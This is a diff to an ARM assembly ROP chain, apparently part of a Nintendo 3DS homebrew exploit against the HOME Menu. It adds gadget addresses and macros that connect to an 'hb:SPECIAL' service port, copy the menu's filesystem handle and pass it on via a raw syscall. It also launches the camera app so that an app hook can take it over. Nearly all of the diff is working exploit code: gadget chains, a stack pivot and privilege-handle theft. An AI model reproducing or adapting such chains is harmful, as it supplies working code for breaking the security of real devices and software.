@@ -10,10 +10,12 @@ MENU_STACK_PIVOT equ 0x00100fdc ; our stack pivot (found by yellows8) : ldmdavc 
 MENU_NOP equ 0x001575F0 ; pop {pc}
 MENU_NSS_REBOOT equ 0x00139874 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
 MENU_NSS_HANDLE equ 0x002F0F98
+MENU_FS_HANDLE equ 0x002F0F30
 MENU_GSPGPU_HANDLE equ 0x002FDED8
 MENU_PAD equ 0x1000001C
 MENU_KEYCOMBO equ 0x00000008 ; START
 MENU_SLEEP equ 0x0012E64C
+MENU_CONNECTTOPORT equ 0x0011C544
 
 MENU_NSS_LAUNCHTITLE equ 0x0020E640 ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
 MENU_GSPGPU_RELEASERIGHT equ 0x0013148C ; r0 : handle addr
@@ -48,10 +50,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0x00000001 ; sp_0 (flag)
 .endmacro
 
-.macro memcpy,dst,src,size
-	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
-		.word dst ; r0 (out ptr)
+.macro memcpy_r0_lr,src,size
 	.word 0x00214988 ; pop {r1, pc}
 		.word src ; r1 (src)
 	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
@@ -61,6 +60,13 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0xDEADBABE ; r5 (garbage)
 		.word 0xDEADBABE ; r6 (garbage)
 	.word MENU_MEMCPY
+.endmacro
+
+.macro memcpy,dst,src,size
+	set_lr MENU_NOP
+	.word 0x001575ac ; pop {r0, pc}
+		.word dst ; r0 (out ptr)
+	memcpy_r0_lr
 .endmacro
 
 .macro gsp_release_right
@@ -112,6 +118,33 @@ SNS_CODE_OFFSET equ 0x0001D300
 	.word MENU_SLEEP
 .endmacro
 
+.macro connect_to_port,out_ptr,port_name
+	set_lr MENU_NOP
+	.word 0x001575ac ; pop {r0, pc}
+		.word out_ptr ; r0
+	.word 0x00214988 ; pop {r1, pc}
+		.word port_name ; r1
+	.word MENU_CONNECTTOPORT
+.endmacro
+
+.macro transfer_word,dst,src
+	.word 0x001575ac ; pop {r0, pc}
+		.word src ; r0
+	.word 0x0013744c ; ldr r0, [r0] ; pop {r4, pc}
+		.word dst ; r1
+	.word 0x001f3c30 ; str r0, [r4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro get_cmdbuf
+	set_lr MENU_NOP
+	.word 0x0013f7a4 ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
+	.word 0x00214988 ; pop {r1, pc}
+		.word (0x80-0x5C) / 4 ; r1
+	.word 0x001e58e0 ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro infloop
 	set_lr 0x00207080 ; bx lr
 	.word 0x00207080 ; bx lr
@@ -135,6 +168,18 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 		; sleep for a bit
 			sleep 500*1000*1000, 0x00000000
+
+		; send fs handle to hb:SPECIAL
+			connect_to_port (MENU_OBJECT_LOC + hbspecialHandle - object), (MENU_OBJECT_LOC + hbspecialString - object)
+			transfer_word (MENU_OBJECT_LOC + sendFsCommandHandle - object), MENU_FS_HANDLE
+			get_cmdbuf
+			memcpy_r0_lr (MENU_OBJECT_LOC + sendFsCommand - object), (sendFsCommand_end - sendFsCommand)
+			.word 0x001575ac ; pop {r0, pc}
+				.word (MENU_OBJECT_LOC + hbspecialHandle - object) ; r0 (hb handle)
+			.word 0x00101c74 ; pop {r4, pc}
+				.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
+  			.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+				.word 0xDEADBABE ; r4 (garbage)
 
 		; launch app that we want to takeover
 			nss_launch_title 0x00020400, 0x00040010 ; launch camera app
@@ -200,6 +245,25 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0x00000008 ; flags
 		.word 0x00000000 ; unused
 
+	hbspecialString:
+		.ascii "hb:SPECIAL"
+		.byte 0x00
+
+	.align 0x4
+	hbspecialHandle:
+		.word 0x00000000
+
+	.align 0x4
+	sendFsCommand:
+		.word 0x000300C2 ; command header
+		.word 0x00000002 ; index (0 and 1 are reserved)
+		.word 0x553A7366 ; name (first half)
+		.word 0x00524553 ; name (second half)
+		.word 0x00000000 ; value 0
+		sendFsCommandHandle:
+		.word 0x00000000 ; handle
+	sendFsCommand_end:
+
 	.align 0x20
 	snsCodeHook:
 		.arm
@@ -236,7 +300,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 	appHook:
 		.arm
-			ldr r0, =1000*1000*1000 ; 1000ms
+			ldr r0, =500*1000*1000 ; 1000ms
 			ldr r1, =0x00000000
 			.word 0xef00000a ; svcSleepThread
 			ldr r2, =0x00100000 + 0x00100000
